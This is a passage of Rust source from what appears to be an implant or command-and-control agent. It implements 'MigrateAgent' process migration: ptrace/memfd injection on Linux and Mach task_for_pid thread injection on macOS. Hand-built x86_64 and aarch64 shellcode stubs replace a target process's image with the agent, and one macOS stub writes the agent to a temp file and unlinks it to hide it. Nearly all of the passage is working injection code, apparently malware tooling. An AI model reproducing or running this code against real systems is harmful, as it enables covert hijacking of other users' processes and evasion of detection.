                    "MigrateAgent: execve stub injected via ptrace+memfd on Linux aarch64"
                );

                // ── Stage 6: Verify takeover ────────────────────────────────
                let verify_deadline = std::time::Instant::now()
                    + std::time::Duration::from_secs(5);
                let mut takeover_verified = false;
                loop {
                    std::thread::sleep(std::time::Duration::from_millis(100));
                    let exe_link = format!("/proc/{target_pid}/exe");
                    match std::fs::read_link(&exe_link) {
                        Ok(target) => {
                            let target_str = target.to_string_lossy().to_string();
                            if target_str.contains("memfd:") {
                                takeover_verified = true;
                                break;
                            }
                            if target_str.contains(&agent_path.to_string_lossy().to_string()) {
                                takeover_verified = true;
                                break;
                            }
                        }
                        Err(e) => {
                            let raw_os = e.raw_os_error().unwrap_or(0);
                            if raw_os == libc::ENOENT {
                                anyhow::bail!(
                                    "MigrateAgent: target pid {target_pid} exited \
                                     before takeover could be verified — execve likely failed"
                                );
                            }
                        }
                    }
                    if std::time::Instant::now() >= verify_deadline {
                        break;
                    }
                }

                if !takeover_verified {
                    anyhow::bail!(
                        "MigrateAgent: takeover verification timed out for pid {target_pid} \
                         — the execve stub may not have executed (seccomp filter? unknown error)"
                    );
                }

                tracing::info!(
                    target_pid,
                    "MigrateAgent: takeover verified — target process image replaced successfully (aarch64)"
                );
            }

            #[cfg(not(any(target_arch = "x86_64", target_arch = "aarch64")))]
            {
                unsafe {
                    libc::ptrace(
                        libc::PTRACE_DETACH,
                        target_pid as libc::pid_t,
                        0usize,
                        0usize,
                    )
                };
                anyhow::bail!(
                    "Linux process migration via ptrace is only implemented for x86_64 and aarch64"
                );
            }

            #[cfg(any(target_arch = "x86_64", target_arch = "aarch64"))]
            Ok(())
        }
    }
}

/// Build a small, fully position-independent shellcode stub that calls
/// `execve(staged_path, NULL, NULL)` and falls through to `exit_group(1)`.
/// Encode an ADR (Compute Address) instruction for aarch64.
///
/// ADR encoding (ARM Architecture Reference Manual DDI 0487):
///   bit 31    = op  (0 for ADR, 1 for ADRP)
///   bits 30:29 = immlo[1:0]
///   bits 28:24 = 10000
///   bits 23:5  = immhi[18:0]
///   bits 4:0   = Rd
///
/// The signed PC-relative offset is split into immhi and immlo:
///   immhi = (offset >> 2) & 0x7FFFF
///   immlo = offset & 0x3
///
/// Final encoding: `(0b10000 << 24) | (immhi << 5) | (immlo << 29) | Rd`
#[cfg(all(target_os = "linux", target_arch = "aarch64"))]
fn encode_adr(rd: u32, offset: i32) -> [u8; 4] {
    debug_assert!(rd < 31, "ADR: Rd must be 0..30");
    let immlo = (offset as u32) & 0x3;
    let immhi = ((offset as u32) >> 2) & 0x7FFFF;
    let insn = (0b10000u32 << 24) | (immhi << 5) | (immlo << 29) | (rd & 0x1F);
    insn.to_le_bytes()
}

/// The path string is appended immediately after the machine-code so the
/// stub is entirely self-contained and can be injected as a single flat blob.
///
/// The stub is generated at runtime so the path length can vary.
#[cfg(target_os = "linux")]
fn build_execve_stub(path: &std::path::Path) -> anyhow::Result<Vec<u8>> {
    use std::os::unix::ffi::OsStrExt;
    let path_bytes = path.as_os_str().as_bytes();
    if path_bytes.contains(&0u8) {
        anyhow::bail!("staged path contains a null byte: {}", path.display());
    }

    #[cfg(target_arch = "x86_64")]
    {
        // Code layout (32 bytes):
        //  [0] 48 8D 3D 19 00 00 00  lea rdi, [rip+25]  → path string at offset 32
        //  [7] 48 31 F6              xor rsi, rsi        → argv=NULL
        // [10] 48 31 D2              xor rdx, rdx        → envp=NULL
        // [13] B8 3B 00 00 00        mov eax, 59         → SYS_execve
        // [18] 0F 05                 syscall
        // [20] BF 01 00 00 00        mov edi, 1          → exit_group arg
        // [25] B8 E7 00 00 00        mov eax, 231        → SYS_exit_group
        // [30] 0F 05                 syscall
        // [32] <path bytes> \0
        const CODE_SIZE: usize = 32;
        let rel: i32 = CODE_SIZE as i32 - 7; // RIP-relative offset for the lea
        let mut stub = vec![0x48, 0x8D, 0x3D];
        stub.extend_from_slice(&rel.to_le_bytes());
        stub.extend_from_slice(&[
            0x48, 0x31, 0xF6, // xor rsi, rsi
            0x48, 0x31, 0xD2, // xor rdx, rdx
            0xB8, 0x3B, 0x00, 0x00, 0x00, // mov eax, 59
            0x0F, 0x05, // syscall
            0xBF, 0x01, 0x00, 0x00, 0x00, // mov edi, 1
            0xB8, 0xE7, 0x00, 0x00, 0x00, // mov eax, 231
            0x0F, 0x05, // syscall
        ]);
        debug_assert_eq!(stub.len(), CODE_SIZE);
        stub.extend_from_slice(path_bytes);
        stub.push(0);
        Ok(stub)
    }

    #[cfg(target_arch = "aarch64")]
    {
        // Code layout (32 bytes):
        //  [0]  <adr>         adr x0, #CODE_SIZE  → path string at CODE_SIZE
        //  [4]  01 00 80 D2  movz x1, #0   → argv=NULL
        //  [8]  02 00 80 D2  movz x2, #0   → envp=NULL
        // [12]  A8 1B 80 D2  movz x8, #221 → SYS_execve (aarch64)
        // [16]  01 00 00 D4  svc #0
        // [20]  20 00 80 D2  movz x0, #1   → exit_group arg
        // [24]  C8 0B 80 D2  movz x8, #94  → SYS_exit_group (aarch64)
        // [28]  01 00 00 D4  svc #0
        // [32]  <path bytes> \0
        const CODE_SIZE: usize = 32;
        const PATH_OFFSET: i32 = CODE_SIZE as i32;

        // Verify the offset is representable in ADR's 21-bit signed immediate.
        debug_assert!(PATH_OFFSET >= -(1 << 20) && PATH_OFFSET < (1 << 20));

        let adr_bytes = encode_adr(0, PATH_OFFSET);

        // Round-trip assertion: re-decode the generated bytes and confirm the
        // offset matches.  This catches any drift in the encoding logic.
        {
            let insn = u32::from_le_bytes(adr_bytes);
            let rd = insn & 0x1F;
            let immlo = (insn >> 29) & 0x3;
            let immhi = (insn >> 5) & 0x7FFFF;
            // Sign-extend immhi from 19 bits.
            let immhi_signed = ((immhi as i32) << 13) >> 13;
            let decoded_offset = (immhi_signed << 2) | (immlo as i32);
            debug_assert_eq!(rd, 0, "encode_adr: Rd should be 0");
            debug_assert_eq!(
                decoded_offset, PATH_OFFSET,
                "encode_adr: decoded offset {decoded_offset} != expected {PATH_OFFSET}"
            );
        }

        let mut stub = vec![
            0x01, 0x00, 0x80, 0xD2, // movz x1, #0
            0x02, 0x00, 0x80, 0xD2, // movz x2, #0
            0xA8, 0x1B, 0x80, 0xD2, // movz x8, #221 (execve)
            0x01, 0x00, 0x00, 0xD4, // svc #0
            0x20, 0x00, 0x80, 0xD2, // movz x0, #1
            0xC8, 0x0B, 0x80, 0xD2, // movz x8, #94 (exit_group)
            0x01, 0x00, 0x00, 0xD4, // svc #0
        ];
        let mut out = Vec::with_capacity(CODE_SIZE + path_bytes.len() + 1);
        out.extend_from_slice(&adr_bytes);
        out.append(&mut stub);
        debug_assert_eq!(out.len(), CODE_SIZE);
        out.extend_from_slice(path_bytes);
        out.push(0);
        Ok(out)
    }

    #[cfg(not(any(target_arch = "x86_64", target_arch = "aarch64")))]
    anyhow::bail!("build_execve_stub: unsupported architecture")
}

#[cfg(target_os = "macos")]
#[derive(Debug, Clone, Copy)]
enum MacosMigrationStrategy {
    /// In-memory execution via anonymous temp file:
    /// `open` + `write` + `unlink` + `/dev/fd/N` + `execve`.
    /// The temp file is immediately unlinked so it vanishes from the
    /// filesystem; the fd remains valid for execve via /dev/fd/N.
    ShmExecve,
    /// Execute the current on-disk agent binary path directly via execve.
    OnDiskExecve,
}

#[cfg(target_os = "macos")]
fn detect_macos_migration_strategy() -> Result<MacosMigrationStrategy> {
    // macOS does not have memfd_create (that is a Linux-only API).
    // Instead we use an anonymous temp-file approach: open a file, write the
    // agent binary to it, unlink it immediately (so the directory entry is
    // gone), then execve via /dev/fd/N.  The file content lives in the
    // filesystem page cache / tmpfs and is cleaned up when the last fd closes.
    let version = std::process::Command::new("sw_vers")
        .args(["-productVersion"])
        .output()
        .ok()
        .filter(|o| o.status.success())
        .map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string())
        .ok_or_else(|| anyhow::anyhow!("unable to determine macOS version via sw_vers"))?;

    let major = version
        .split('.')
        .next()
        .and_then(|s| s.parse::<u32>().ok())
        .ok_or_else(|| anyhow::anyhow!("unable to parse macOS version '{version}'"))?;

    if major >= 13 {
        Ok(MacosMigrationStrategy::ShmExecve)
    } else {
        tracing::warn!(
            "macOS {version}: using on-disk execve fallback (anonymous temp-file migration \
             requires macOS 13+)"
        );
        Ok(MacosMigrationStrategy::OnDiskExecve)
    }
}

#[cfg(target_os = "macos")]
fn read_macos_process_command(pid: u32) -> Option<String> {
    let output = std::process::Command::new("ps")
        .args(["-p", &pid.to_string(), "-o", "command="])
        .output()
        .ok()?;
    if !output.status.success() {
        return None;
    }
    let cmd = String::from_utf8_lossy(&output.stdout).trim().to_string();
    if cmd.is_empty() {
        None
    } else {
        Some(cmd)
    }
}

#[cfg(target_os = "macos")]
fn is_macos_process_alive(pid: u32) -> bool {
    let rc = unsafe { libc::kill(pid as libc::pid_t, 0) };
    if rc == 0 {
        return true;
    }
    std::io::Error::last_os_error().raw_os_error() == Some(libc::EPERM)
}

#[cfg(target_os = "macos")]
fn wait_for_macos_exec_takeover(
    target_pid: u32,
    baseline_cmd: &str,
    expected_cmd_marker: Option<&str>,
) -> Result<()> {
    let deadline = std::time::Instant::now() + std::time::Duration::from_secs(3);
    while std::time::Instant::now() < deadline {
        if !is_macos_process_alive(target_pid) {
            anyhow::bail!(
                "migration target pid={} exited before stager execution could be confirmed",
                target_pid
            );
        }

        if let Some(cmd) = read_macos_process_command(target_pid) {
            if let Some(marker) = expected_cmd_marker {
                if cmd.contains(marker) {
                    return Ok(());
                }
                if cmd != baseline_cmd {
                    tracing::debug!(
                            target_pid,
                            marker,
                            "migration verification: command changed but expected marker not present yet: '{}'",
                            cmd
                        );
                }
            } else if cmd != baseline_cmd {
                return Ok(());
            }
        }

        std::thread::sleep(std::time::Duration::from_millis(100));
    }

    if let Some(marker) = expected_cmd_marker {
        anyhow::bail!(
                "migration thread launched for pid={}, but exec takeover marker '{}' was not observed within timeout",
                target_pid,
                marker
            )
    } else {
        anyhow::bail!(
                "migration thread launched for pid={}, but command-line takeover could not be verified within timeout",
                target_pid
            )
    }
}

#[cfg(target_os = "macos")]
pub fn migrate_to_process(target_pid: u32) -> Result<()> {
    tracing::info!("MigrateAgent invoked for macOS pid {target_pid}");

    if target_pid == 0 || target_pid as i32 == unsafe { libc::getpid() } {
        anyhow::bail!("Cannot migrate to system idle or self on macOS");
    }

    // task_for_pid requires that the caller is root OR holds the
    // com.apple.security.cs.debugger entitlement.  We check early to give a
    // clear diagnostic rather than a cryptic KERN_FAILURE.
    let our_uid = unsafe { libc::getuid() };
    if our_uid != 0 {
        anyhow::bail!(
            "macOS process migration requires root or com.apple.security.cs.debugger entitlement \
             (current uid={})",
            our_uid
        );
    }

    let strategy = detect_macos_migration_strategy()?;
    let baseline_cmd = read_macos_process_command(target_pid).ok_or_else(|| {
        anyhow::anyhow!(
            "failed to capture baseline command line for pid {} before migration",
            target_pid
        )
    })?;

    // The fallback strategy executes the current on-disk binary directly,
    // while the preferred strategy injects the binary bytes and executes
    // through /dev/fd.
    let agent_path =
        std::env::current_exe().map_err(|e| anyhow::anyhow!("current_exe() failed: {e}"))?;
    let agent_path_str = agent_path.to_string_lossy().to_string();
    #[cfg(target_os = "macos")]
    use std::os::unix::ffi::OsStrExt;
    let agent_path_bytes = agent_path.as_os_str().as_bytes().to_vec();

    let agent_binary = match strategy {
        MacosMigrationStrategy::ShmExecve => {
            let bytes = std::fs::read(&agent_path).map_err(|e| {
                anyhow::anyhow!("failed to read agent binary {}: {e}", agent_path.display())
            })?;
            tracing::info!(
                "read agent binary ({} bytes) for macOS migration strategy {:?}",
                bytes.len(),
                strategy
            );
            Some(bytes)
        }
        MacosMigrationStrategy::OnDiskExecve => {
            tracing::info!(
                "using on-disk execve fallback for macOS migration strategy {:?}: {}",
                strategy,
                agent_path.display()
            );
            None
        }
    };

    // The shellcode stub is built after we know the address of the binary data
    // in the target process.  See the architecture-specific blocks below.

    // --- Mach API declarations ---
    // mach_port_t is u32 on both arm64 and x86_64 macOS.
    #[allow(non_camel_case_types)]
    type mach_port_t = u32;
    #[allow(non_camel_case_types)]
    type kern_return_t = i32;
    #[allow(non_camel_case_types)]
    type mach_vm_address_t = u64;
    #[allow(non_camel_case_types)]
    type mach_vm_size_t = u64;
    const KERN_SUCCESS: kern_return_t = 0;
    const VM_FLAGS_ANYWHERE: i32 = 1;
    const VM_PROT_READ: i32 = 1;
    const VM_PROT_WRITE: i32 = 2;
    const VM_PROT_EXECUTE: i32 = 4;

    extern "C" {
        fn mach_task_self() -> mach_port_t;
        fn task_for_pid(host: mach_port_t, pid: i32, task: *mut mach_port_t) -> kern_return_t;
        fn mach_vm_allocate(
            task: mach_port_t,
            addr: *mut mach_vm_address_t,
            size: mach_vm_size_t,
            flags: i32,
        ) -> kern_return_t;
        fn mach_vm_write(
            task: mach_port_t,
            address: mach_vm_address_t,
            data: *const u8,
            data_cnt: u32,
        ) -> kern_return_t;
        fn mach_vm_protect(
            task: mach_port_t,
            address: mach_vm_address_t,
            size: mach_vm_size_t,
            set_maximum: bool,
            new_protection: i32,
        ) -> kern_return_t;
        fn mach_port_deallocate(task: mach_port_t, name: mach_port_t) -> kern_return_t;
    }

    // x86_64 thread state
    #[cfg(target_arch = "x86_64")]
    {
        const X86_THREAD_STATE64: u32 = 4;
        const X86_THREAD_STATE64_COUNT: u32 = 42;

        #[repr(C)]
        #[derive(Default)]
        struct X86ThreadState64 {
            rax: u64,
            rbx: u64,
            rcx: u64,
            rdx: u64,
            rdi: u64,
            rsi: u64,
            rbp: u64,
            rsp: u64,
            r8: u64,
            r9: u64,
            r10: u64,
            r11: u64,
            r12: u64,
            r13: u64,
            r14: u64,
            r15: u64,
            rip: u64,
            rflags: u64,
            cs: u64,
            fs: u64,
            gs: u64,
            // padding to hit 42 u32-words = 168 bytes = 21 u64
            _pad: u64,
        }

        extern "C" {
            fn thread_create_running(
                task: mach_port_t,
                flavor: u32,
                new_state: *const u32,
                new_state_cnt: u32,
                child_thread: *mut mach_port_t,
            ) -> kern_return_t;
        }

        unsafe {
            let host = mach_task_self();
            let mut target_task: mach_port_t = 0;
            let kr = task_for_pid(host, target_pid as i32, &mut target_task);
            if kr != KERN_SUCCESS {
                anyhow::bail!("task_for_pid(pid={target_pid}) failed: kern_return={kr}");
            }

            // 1. Build the selected exec stager.
            let (shellcode, verify_marker): (Vec<u8>, Option<String>) = match strategy {
                MacosMigrationStrategy::ShmExecve => {
                    let agent_binary = agent_binary.as_ref().ok_or_else(|| {
                        anyhow::anyhow!("missing agent binary for shm migration")
                    })?;

                    let mut binary_addr: mach_vm_address_t = 0;
                    let kr = mach_vm_allocate(
                        target_task,
                        &mut binary_addr,
                        agent_binary.len() as u64,
                        VM_FLAGS_ANYWHERE,
                    );
                    if kr != KERN_SUCCESS {
                        mach_port_deallocate(host, target_task);
                        anyhow::bail!("mach_vm_allocate(binary) failed: kern_return={kr}");
                    }

                    let kr = mach_vm_write(
                        target_task,
                        binary_addr,
                        agent_binary.as_ptr(),
                        agent_binary.len() as u32,
                    );
                    if kr != KERN_SUCCESS {
                        mach_port_deallocate(host, target_task);
                        anyhow::bail!("mach_vm_write(binary) failed: kern_return={kr}");
                    }

                    (
                        build_macos_shm_stub_x86_64(binary_addr, agent_binary.len()),
                        Some("/dev/fd/".to_string()),
                    )
                }
                MacosMigrationStrategy::OnDiskExecve => (
                    build_macos_execve_path_stub(&agent_path_bytes)?,
                    Some(agent_path_str.clone()),
                ),
            };

            // 4. Allocate RW region for the shellcode.
            let mut code_addr: mach_vm_address_t = 0;
            let kr = mach_vm_allocate(
                target_task,
                &mut code_addr,
                shellcode.len() as u64,
                VM_FLAGS_ANYWHERE,
            );
            if kr != KERN_SUCCESS {
                mach_port_deallocate(host, target_task);
                anyhow::bail!("mach_vm_allocate(code) failed: kern_return={kr}");
            }

            // 5. Write the shellcode.
            let kr = mach_vm_write(
                target_task,
                code_addr,
                shellcode.as_ptr(),
                shellcode.len() as u32,
            );
            if kr != KERN_SUCCESS {
                mach_port_deallocate(host, target_task);
                anyhow::bail!("mach_vm_write(code) failed: kern_return={kr}");
            }

            // 6. Protect the code region to RX.
            let kr = mach_vm_protect(
                target_task,
                code_addr,
                shellcode.len() as u64,
                false,
                VM_PROT_READ | VM_PROT_EXECUTE,
            );
            if kr != KERN_SUCCESS {
                mach_port_deallocate(host, target_task);
                anyhow::bail!("mach_vm_protect(RX) failed: kern_return={kr}");
            }

            // 7. Create a new thread whose initial RIP points at the shellcode.
            //    The shellcode performs: memfd_create → write(fd, binary, len) →
            //    format /dev/fd/N → execve → exit(1) fallback.
            let mut state = X86ThreadState64::default();
            state.rip = code_addr;
            let stack_size: mach_vm_size_t = 8 * 1024 * 1024;
            let mut stack_addr: mach_vm_address_t = 0;
            mach_vm_allocate(target_task, &mut stack_addr, stack_size, VM_FLAGS_ANYWHERE);
            mach_vm_protect(
                target_task,
                stack_addr,
                stack_size,
                false,
                VM_PROT_READ | VM_PROT_WRITE,
            );
            state.rsp = (stack_addr + stack_size - 8) & !15;

            let mut new_thread: mach_port_t = 0;
            let kr = thread_create_running(
                target_task,
                X86_THREAD_STATE64,
                &state as *const _ as *const u32,
                X86_THREAD_STATE64_COUNT,
                &mut new_thread,
            );
            mach_port_deallocate(host, target_task);
            if kr != KERN_SUCCESS {
                anyhow::bail!("thread_create_running failed: kern_return={kr}");
            }
            let verify_result =
                wait_for_macos_exec_takeover(target_pid, &baseline_cmd, verify_marker.as_deref());
            mach_port_deallocate(mach_task_self(), new_thread);
            verify_result?;
            tracing::info!(
                target_pid,
                "MigrateAgent: migration stager execution verified via Mach API (x86_64)"
            );
            Ok(())
        }
    }

    #[cfg(target_arch = "aarch64")]
    {
        const ARM_THREAD_STATE64: u32 = 6;
        const ARM_THREAD_STATE64_COUNT: u32 = 68;

        #[repr(C)]
        #[derive(Default)]
        struct ArmThreadState64 {
            x: [u64; 29], // x0..x28
            fp: u64,      // x29 / frame pointer
            lr: u64,      // x30 / link register
            sp: u64,      // stack pointer
            pc: u64,      // program counter
            cpsr: u32,    // CPSR
            _pad: u32,
        }

        extern "C" {
            fn thread_create_running(
                task: mach_port_t,
                flavor: u32,
                new_state: *const u32,
                new_state_cnt: u32,
                child_thread: *mut mach_port_t,
            ) -> kern_return_t;
        }

        unsafe {
            let host = mach_task_self();
            let mut target_task: mach_port_t = 0;
            let kr = task_for_pid(host, target_pid as i32, &mut target_task);
            if kr != KERN_SUCCESS {
                anyhow::bail!("task_for_pid(pid={target_pid}) failed: kern_return={kr}");
            }

            // 1. Build the selected exec stager.
            let (shellcode, verify_marker): (Vec<u8>, Option<String>) = match strategy {
                MacosMigrationStrategy::ShmExecve => {
                    let agent_binary = agent_binary.as_ref().ok_or_else(|| {
                        anyhow::anyhow!("missing agent binary for shm migration")
                    })?;

                    let mut binary_addr: mach_vm_address_t = 0;
                    let kr = mach_vm_allocate(
                        target_task,
                        &mut binary_addr,
                        agent_binary.len() as u64,
                        VM_FLAGS_ANYWHERE,
                    );
                    if kr != KERN_SUCCESS {
                        mach_port_deallocate(host, target_task);
                        anyhow::bail!("mach_vm_allocate(binary) failed: kern_return={kr}");
                    }

                    let kr = mach_vm_write(
                        target_task,
                        binary_addr,
                        agent_binary.as_ptr(),
                        agent_binary.len() as u32,
                    );
                    if kr != KERN_SUCCESS {
                        mach_port_deallocate(host, target_task);
                        anyhow::bail!("mach_vm_write(binary) failed: kern_return={kr}");
                    }

                    (
                        build_macos_shm_stub_aarch64(binary_addr, agent_binary.len()),
                        Some("/dev/fd/".to_string()),
                    )
                }
                MacosMigrationStrategy::OnDiskExecve => (
                    build_macos_execve_path_stub(&agent_path_bytes)?,
                    Some(agent_path_str.clone()),
                ),
            };

            // 4. Allocate RW region for the shellcode.
            let mut code_addr: mach_vm_address_t = 0;
            let kr = mach_vm_allocate(
                target_task,
                &mut code_addr,
                shellcode.len() as u64,
                VM_FLAGS_ANYWHERE,
            );
            if kr != KERN_SUCCESS {
                mach_port_deallocate(host, target_task);
                anyhow::bail!("mach_vm_allocate(code) failed: kern_return={kr}");
            }

            // 5. Write the shellcode.
            let kr = mach_vm_write(
                target_task,
                code_addr,
                shellcode.as_ptr(),
                shellcode.len() as u32,
            );
            if kr != KERN_SUCCESS {
                mach_port_deallocate(host, target_task);
                anyhow::bail!("mach_vm_write(code) failed: kern_return={kr}");
            }

            // 6. Protect the code region to RX.
            let kr = mach_vm_protect(
                target_task,
                code_addr,
                shellcode.len() as u64,
                false,
                VM_PROT_READ | VM_PROT_EXECUTE,
            );
            if kr != KERN_SUCCESS {
                mach_port_deallocate(host, target_task);
                anyhow::bail!("mach_vm_protect(RX) failed: kern_return={kr}");
            }

            // 7. Create a new thread whose initial PC points at the shellcode.
            let mut state = ArmThreadState64::default();
            state.pc = code_addr;
            let stack_size: mach_vm_size_t = 8 * 1024 * 1024;
            let mut stack_addr: mach_vm_address_t = 0;
            mach_vm_allocate(target_task, &mut stack_addr, stack_size, VM_FLAGS_ANYWHERE);
            mach_vm_protect(
                target_task,
                stack_addr,
                stack_size,
                false,
                VM_PROT_READ | VM_PROT_WRITE,
            );
            state.sp = (stack_addr + stack_size) & !15;

            let mut new_thread: mach_port_t = 0;
            let kr = thread_create_running(
                target_task,
                ARM_THREAD_STATE64,
                &state as *const _ as *const u32,
                ARM_THREAD_STATE64_COUNT,
                &mut new_thread,
            );
            mach_port_deallocate(host, target_task);
            if kr != KERN_SUCCESS {
                anyhow::bail!("thread_create_running(arm64) failed: kern_return={kr}");
            }
            let verify_result =
                wait_for_macos_exec_takeover(target_pid, &baseline_cmd, verify_marker.as_deref());
            mach_port_deallocate(mach_task_self(), new_thread);
            verify_result?;
            tracing::info!(
                target_pid,
                "MigrateAgent: migration stager execution verified via Mach API (aarch64)"
            );
            Ok(())
        }
    }

    #[cfg(not(any(target_arch = "x86_64", target_arch = "aarch64")))]
    {
        // For macOS architectures other than x86_64 and aarch64, Mach thread
        // injection via arch-specific shellcode is unavailable.  Fall back to
        // fork + exec: spawn a fresh copy of the agent as a standalone process.
        // This is architecturally independent and keeps the agent running even
        // when thread-injection into `target_pid` is not possible.
        let _ = (agent_binary, &baseline_cmd, strategy);
        let agent_path = std::env::current_exe()
            .map_err(|e| anyhow::anyhow!("current_exe() failed: {e}"))?;
        let agent_path_cstr = std::ffi::CString::new(
            agent_path.to_string_lossy().as_bytes(),
        )
        .map_err(|e| anyhow::anyhow!("CString::new failed: {e}"))?;
        unsafe {
            let pid = libc::fork();
            if pid < 0 {
                anyhow::bail!(
                    "fork() failed for macOS migration fallback: {}",
                    std::io::Error::last_os_error()
                );
            }
            if pid == 0 {
                // Child: detach from the terminal session and exec the agent.
                libc::setsid();
                let argv = [
                    agent_path_cstr.as_ptr(),
                    core::ptr::null::<libc::c_char>(),
                ];
                libc::execv(agent_path_cstr.as_ptr(), argv.as_ptr());
                libc::_exit(1); // execv failed
            }
            // Parent: new agent process spawned; report the PID.
            tracing::info!(
                spawned_pid = pid,
                target_pid,
                "macOS migration fallback (non-x86_64/aarch64): spawned new agent process"
            );
        }
        Ok(())
    }
}

/// Build a position-independent shellcode stub that performs anonymous
/// temp-file process migration on macOS.
///
/// macOS does NOT provide `memfd_create` (that is a Linux-only API).
/// Instead the stub executes the following syscall sequence:
///   1. getpid() → pid
///   2. Build "/tmp/.ox<PID>" path on the stack via itoa
///   3. open(path, O_RDWR|O_CREAT|O_TRUNC, 0700) → fd
///   4. write(fd, binary_addr, binary_len)
///   5. unlink(path) (immediately remove directory entry)
///   6. Build "/dev/fd/N" path on the stack via itoa
///   7. execve("/dev/fd/N", NULL, NULL)
///   8. exit(1) if execve fails
///
/// The temp file is unlinked immediately after write, so it vanishes from
/// the filesystem directory listing.  The fd remains valid for execve via
/// the `/dev/fd/N` magic path.
#[cfg(target_os = "macos")]
fn build_macos_shm_stub_x86_64(binary_addr: u64, binary_len: usize) -> Vec<u8> {
    // Stub function that dispatches to the arch-specific builder.
    #[cfg(target_arch = "x86_64")]
    {
        build_macos_shm_stub_x86_64_impl(binary_addr, binary_len)
    }
    #[cfg(not(target_arch = "x86_64"))]
    {
        let _ = (binary_addr, binary_len);
        Vec::new()
    }
}

#[cfg(target_os = "macos")]
fn build_macos_shm_stub_aarch64(binary_addr: u64, binary_len: usize) -> Vec<u8> {
    #[cfg(target_arch = "aarch64")]
    {
        build_macos_shm_stub_aarch64_impl(binary_addr, binary_len)
    }
    #[cfg(not(target_arch = "aarch64"))]
    {
        let _ = (binary_addr, binary_len);
        Vec::new()
    }
}

/// Build a position-independent shellcode stub that calls
/// `execve(current_agent_path, NULL, NULL)` on macOS.
#[cfg(target_os = "macos")]
fn build_macos_execve_path_stub(path_bytes: &[u8]) -> Result<Vec<u8>> {
    if path_bytes.is_empty() {
        anyhow::bail!("macOS fallback path is empty");
    }

    #[cfg(target_arch = "x86_64")]
    {
        Ok(build_macos_execve_path_stub_x86_64(path_bytes))
    }
    #[cfg(target_arch = "aarch64")]
    {
        build_macos_execve_path_stub_aarch64(path_bytes)
    }
    #[cfg(not(any(target_arch = "x86_64", target_arch = "aarch64")))]
    {
        // For hypothetical future macOS architectures, we cannot emit arch-specific
        // machine code.  Return an empty stub — the caller (migrate_to_process)
        // uses the fork+exec fallback on non-x86_64/aarch64 and will not reach
        // this path.  An empty Vec signals "no shellcode available" to any future
        // callers that may be added.
        let _ = path_bytes;
        Ok(Vec::new())
    }
}

#[cfg(all(target_os = "macos", target_arch = "x86_64"))]
fn build_macos_execve_path_stub_x86_64(path_bytes: &[u8]) -> Vec<u8> {
    // call + pop to get RIP-relative pointer to the appended path string.
    let mut code: Vec<u8> = vec![
        0xE8, 0x00, 0x00, 0x00, 0x00, // call +0
        0x5F, // pop rdi
        0x48, 0x81, 0xC7, 0x00, 0x00, 0x00, 0x00, // add rdi, <path_off>
        0x31, 0xF6, // xor esi, esi
        0x31, 0xD2, // xor edx, edx
        0x48, 0xB8, // mov rax, <sys_execve>
    ];
    code.extend_from_slice(&(0x2000000u64 + 59).to_le_bytes());
    code.extend_from_slice(&[
        0x0F, 0x05, // syscall
        0xBF, 0x01, 0x00, 0x00, 0x00, // mov edi, 1
        0x48, 0xB8, // mov rax, <sys_exit>
    ]);
    code.extend_from_slice(&(0x2000000u64 + 1).to_le_bytes());
    code.extend_from_slice(&[0x0F, 0x05]); // syscall

    let code_len = code.len();
    let path_off_from_pop = (code_len - 5) as u32;
    code[9..13].copy_from_slice(&path_off_from_pop.to_le_bytes());

    code.extend_from_slice(path_bytes);
    code.push(0);
    code
}

#[cfg(all(target_os = "macos", target_arch = "aarch64"))]
fn build_macos_execve_path_stub_aarch64(path_bytes: &[u8]) -> Result<Vec<u8>> {
    // ADR x0, <path>; movz x1,#0; movz x2,#0; movz x16,#59; svc #0;
    // movz x0,#1; movz x16,#1; svc #0.
    let mut insts: Vec<u32> = vec![
        0,          // adr x0, <path> (patched below)
        0xD2800001, // movz x1, #0
        0xD2800002, // movz x2, #0
        0xD2800770, // movz x16, #59 (SYS_execve)
        0xD4000001, // svc #0x80
        0xD2800020, // movz x0, #1
        0xD2800030, // movz x16, #1 (SYS_exit)
        0xD4000001, // svc #0x80
    ];

    let code_len = insts.len() * 4;
    let path_off = code_len as i64;
    // ADR immediate range is +/-1MB.
    if !(-1_048_576..=1_048_575).contains(&path_off) {
        anyhow::bail!("macOS fallback path stub offset out of ADR range");
    }
    let imm = path_off as i32;
    let immlo = (imm as u32) & 0x3;
    let immhi = ((imm as u32) >> 2) & 0x7FFFF;
    insts[0] = 0x10000000 | (immlo << 29) | (immhi << 5) | 0;

    let mut out: Vec<u8> = insts.into_iter().flat_map(u32::to_le_bytes).collect();
    out.extend_from_slice(path_bytes);
    out.push(0);
    Ok(out)
}

/// macOS x86_64 anonymous temp-file + execve shellcode.
/// Uses BSD syscall ABI: syscall number in rax | 0x2000000.
///
/// Sequence:
///   getpid → itoa → build "/tmp/.ox<PID>" → open → write → unlink →
///   itoa fd → build "/dev/fd/N" → execve → exit(1)
#[cfg(all(target_os = "macos", target_arch = "x86_64"))]
fn build_macos_shm_stub_x86_64_impl(binary_addr: u64, binary_len: usize) -> Vec<u8> {
    let mut code = Vec::new();

    // === Step 1: getpid() → pid in rax ===
    // mov rax, 0x2000000 + 20 (SYS_getpid)
    code.extend_from_slice(&[0x48, 0xb8]);
    code.extend_from_slice(&(0x2000000u64 + 20).to_le_bytes());
    // syscall
    code.extend_from_slice(&[0x0f, 0x05]);

    // === Step 2: Build "/tmp/.ox<PID>" path on stack ===
    // sub rsp, 48 (path buffer, plenty of room)
    code.extend_from_slice(&[0x48, 0x83, 0xec, 0x30]);
    // lea r8, [rsp+47] (point to last byte of buffer)
    code.extend_from_slice(&[0x4c, 0x8d, 0x44, 0x24, 0x2f]);
    // mov byte [r8], 0 (NUL terminator)
    code.extend_from_slice(&[0x41, 0xc6, 0x00, 0x00]);
    // mov rcx, rax (pid for itoa)
    code.extend_from_slice(&[0x48, 0x89, 0xc1]);

    // itoa loop: convert pid to decimal digits right-to-left
    let itoa_loop_start = code.len();
    // dec r8
    code.extend_from_slice(&[0x49, 0xff, 0xc8]);
    // xor edx, edx
    code.extend_from_slice(&[0x31, 0xd2]);
    // mov r9d, 10
    code.extend_from_slice(&[0x41, 0xb9, 0x0a, 0x00, 0x00, 0x00]);
    // div r9 (rax = quotient, rdx = remainder)
    code.extend_from_slice(&[0x49, 0xf7, 0xf1]);
    // add dl, 0x30 ('0')
    code.extend_from_slice(&[0x80, 0xc2, 0x30]);
    // mov [r8], dl
    code.extend_from_slice(&[0x41, 0x88, 0x10]);
    // test rax, rax
    code.extend_from_slice(&[0x48, 0x85, 0xc0]);
